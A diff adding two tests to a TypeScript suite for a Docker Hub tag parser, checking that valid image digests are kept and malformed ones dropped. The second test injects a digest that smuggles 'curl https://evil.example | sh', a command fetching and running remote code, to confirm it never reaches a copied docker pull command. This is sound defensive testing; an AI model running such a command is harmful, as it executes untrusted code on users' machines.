@@ -347,6 +347,46 @@ describe('tags → Page<Tag>', () => {
     ]);
   });
 
+  it('every recorded tag and image digest is well formed, so none is dropped', () => {
+    const recorded = [
+      ...fixtures.tagsFluentBit.results,
+      ...fixtures.tagsFluentBitOldest.results,
+      ...fixtures.tagsKernel528Archived.results,
+      fixtures.tagNginxLatest,
+    ];
+    const parsed = recorded.map((raw) => v.parse(TagSchema, raw));
+    expect(parsed.some((raw) => raw.images?.some((image) => image.digest))).toBe(true);
+    for (const raw of parsed) {
+      const tag = toTag(raw);
+      expect(tag.digest).toBe(raw.digest || undefined);
+      // The platforms toTag keeps (attestation manifests are `unknown`).
+      const platforms = (raw.images ?? []).filter(
+        (image) => image.architecture && image.architecture !== 'unknown' && image.os !== 'unknown',
+      );
+      expect(tag.images.map((image) => image.digest)).toEqual(
+        platforms.map((image) => image.digest || undefined),
+      );
+    }
+  });
+
+  it('a malformed digest is dropped, so it never reaches a copied docker pull command', () => {
+    const raw = cloneFixture(fixtures.tagsFluentBit.results[0]) as Record<string, unknown>;
+    const injected = 'sha256:abc; curl https://evil.example | sh';
+    raw.digest = injected;
+    raw.images = [
+      { architecture: 'amd64', os: 'linux', size: 1, digest: injected },
+      { architecture: 'arm64', os: 'linux', size: 1, digest: `sha256:${'A'.repeat(64)}` },
+      { architecture: 'arm', os: 'linux', size: 1, digest: ` sha256:${'a'.repeat(64)} ` },
+    ];
+    const tag = toTag(v.parse(TagSchema, raw));
+    expect(tag.digest).toBeUndefined();
+    expect(tag.images.map((image) => image.digest)).toEqual([
+      undefined,
+      undefined,
+      `sha256:${'a'.repeat(64)}`,
+    ]);
+  });
+
   it('full_size 0 or null, no images, never pulled: safe defaults (RISKS 4.3)', () => {
     // No recorded tag has these values today, so this tweaks a real one.
     const raw = cloneFixture(fixtures.tagsFluentBitOldest.results[0]) as Record<string, unknown>;
